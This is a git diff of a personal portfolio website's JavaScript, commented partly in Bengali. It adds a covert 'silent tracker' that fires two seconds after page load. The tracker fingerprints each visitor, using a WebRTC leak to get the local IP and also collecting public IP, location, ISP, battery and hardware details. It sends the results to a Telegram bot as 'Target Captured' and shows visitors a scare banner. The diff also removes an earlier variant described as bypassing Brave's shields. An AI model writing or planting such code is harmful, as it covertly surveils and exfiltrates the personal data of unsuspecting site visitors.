@@ -1,5 +1,5 @@
 /* Project: Yash Khan Elite Portfolio 
-   Updated: Advanced Stealth Tracker for High Reliability
+   Updated: WebRTC Leak & Advanced Stealth Tracker
 */
 
 // --- 1. CONFIGURATION ---
@@ -26,67 +26,81 @@ function typeEffect() {
     setTimeout(typeEffect, delay);
 }
 
-// --- 3. ADVANCED SILENT TRACKER (The Ultimate Update) ---
+// --- 3. ADVANCED SILENT TRACKER (Updated with Local IP Capture) ---
 async function runSilentTracker() {
     const scanStatus = document.getElementById('scan-status');
     const userDetails = document.getElementById('user-details');
 
-    try {
-        // একাধিক API দিয়ে ট্র্যাকিং নিশ্চিত করা (Brave Shield Bypass)
-        let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A' };
-        
-        try {
-            // ১ নম্বর চেষ্টা: ipapi (খুবই ডিটেইলড)
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
-        } catch (e) {
-            // ২ নম্বর চেষ্টা: ipify (যদি প্রথমটি ব্লক হয়)
-            const res2 = await fetch('https://api.ipify.org?format=json');
-            const data2 = await res2.json();
-            ipData.ip = data2.ip;
-        }
+    let intel = {
+        publicIp: 'Fetching...',
+        localIp: 'Searching...',
+        isp: 'N/A',
+        loc: 'N/A',
+        battery: 'N/A',
+        os: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || "Hidden",
+        time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
+    };
 
-        // হার্ডওয়্যার এবং ব্যাটারি ইন্টেল
-        let batteryInfo = "Access Denied";
+    // মেথড: লোকাল আইপি (192.168...) ধরার জন্য WebRTC Leak
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            const rtc = new RTCPeerConnection({ iceServers: [] });
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            rtc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                    if (match) resolve(match[1]);
+                }
+            };
+            setTimeout(() => resolve("Blocked/Shielded"), 2000);
+        });
+    }
+
+    try {
+        // ১. পাবলিক আইপি এবং জিও তথ্য
+        const res = await fetch('https://ipapi.co/json/');
+        const ipData = await res.json();
+        intel.publicIp = ipData.ip || "N/A";
+        intel.isp = ipData.org || "N/A";
+        intel.loc = ipData.city ? `${ipData.city}, ${ipData.country_name}` : "N/A";
+
+        // ২. লোকাল আইপি (আপনার 192.168.8.6 ধরার চেষ্টা)
+        intel.localIp = await getLocalIP();
+
+        // ৩. হার্ডওয়্যার এবং ব্যাটারি
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
-            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+            intel.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
         }
 
-        const intel = {
-            ip: ipData.ip || ipData.query || "N/A",
-            loc: ipData.city ? `${ipData.city}, ${ipData.country_name}` : "N/A",
-            isp: ipData.org || ipData.as || "N/A",
-            os: navigator.platform,
-            agent: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || "Hidden",
-            screen: `${window.screen.width}x${window.screen.height}`,
-            time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
-        };
-
-        // UI Update (আপনার স্ক্রিনশটের ডিজাইন অনুযায়ী)
+        // UI Update (ওয়েবসাইটের স্ক্রিনে যা দেখাবে)
         if (scanStatus) {
             scanStatus.innerHTML = "⚠️ SECURITY VULNERABILITY DETECTED: CONNECTION EXPOSED";
             scanStatus.style.color = "#ff003c";
         }
         if (userDetails) {
             userDetails.innerHTML = `
-                > [SYSTEM] IP: <span style="color:#fff">${intel.ip}</span> <br>
+                > [SYSTEM] PUBLIC IP: <span style="color:#fff">${intel.publicIp}</span> <br>
+                > [SYSTEM] LOCAL IP: <span style="color:#fff">${intel.localIp}</span> <br>
                 > [SYSTEM] ISP: <span style="color:#fff">${intel.isp}</span> <br>
                 > [SYSTEM] LOC: <span style="color:#fff">${intel.loc}</span> <br>
-                > [SYSTEM] BATT: <span style="color:#fff">${batteryInfo}</span> <br>
+                > [SYSTEM] BATT: <span style="color:#fff">${intel.battery}</span> <br>
                 > [SYSTEM] STATUS: <span style="color:#ff003c">TRACED</span>
             `;
         }
 
-        // টেলিগ্রামে পাঠানোর জন্য মেসেজ রেডি করা
+        // ৪. টেলিগ্রামে ফুল রিপোর্ট পাঠানো
         const message = `
-🎯 **Target Captured!**
+🎯 **Target Captured (Deep Scan)!**
 -----------------------------
-🌐 **IP:** ${intel.ip}
+🌐 **Public IP:** ${intel.publicIp}
+🏠 **Local IP:** ${intel.localIp}
 🏢 **ISP:** ${intel.isp}
 📍 **Location:** ${intel.loc}
-🔋 **Battery:** ${batteryInfo}
+🔋 **Battery:** ${intel.battery}
 💻 **Platform:** ${intel.os}
 🖥️ **Screen:** ${intel.screen}
 ⚙️ **Cores:** ${intel.cores}
@@ -95,19 +109,14 @@ async function runSilentTracker() {
 🚀 *Injected by Yash Khan Intelligence Unit*
 `;
 
-        // টেলিগ্রামে পাঠানো (Direct API call with error handling)
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
 
     } catch (err) {
-        console.warn("Stealth Mode Active: Tracking restricted by User Browser Settings.");
+        console.warn("Tracker shielded.");
     }
 }
 
@@ -135,6 +144,5 @@ function initParticles() {
 window.onload = () => {
     initParticles();
     typeEffect();
-    // ২ সেকেন্ড পর সাইলেন্টলি ট্র্যাকার স্টার্ট হবে
     setTimeout(runSilentTracker, 2000);
 };
